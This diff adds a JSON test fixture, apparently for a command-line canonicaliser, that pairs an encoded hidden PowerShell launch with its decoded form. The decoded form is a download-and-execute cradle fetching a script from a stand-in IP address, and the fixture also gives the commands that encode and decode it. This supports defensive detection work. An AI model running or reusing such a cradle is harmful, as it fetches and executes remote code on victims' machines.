@@ -1,0 +1,8 @@
+{
+ "material": "\"C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.EXE\" -NoP  -NonI -W Hidden -ExecutionPolicy ByPass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcALwBhAC4AcABzADEAJwApAA==",
+ "rep": "cmdline",
+ "transform": "canon",
+ "expected": "powershell -noprofile -noninteractive -windowstyle hidden -executionpolicy bypass -command IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')",
+ "generator_cmd": "pwsh -c \"[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\\"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')\\\"))\"",
+ "oracle_cmd": "pwsh -c \"[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcALwBhAC4AcABzADEAJwApAA=='))\"; prefix by the rules (image basename lower, .exe off; -NoP/-NonI/-W/-ExecutionPolicy -> full lower names, values lower; -enc -> -command <text>)"
+}
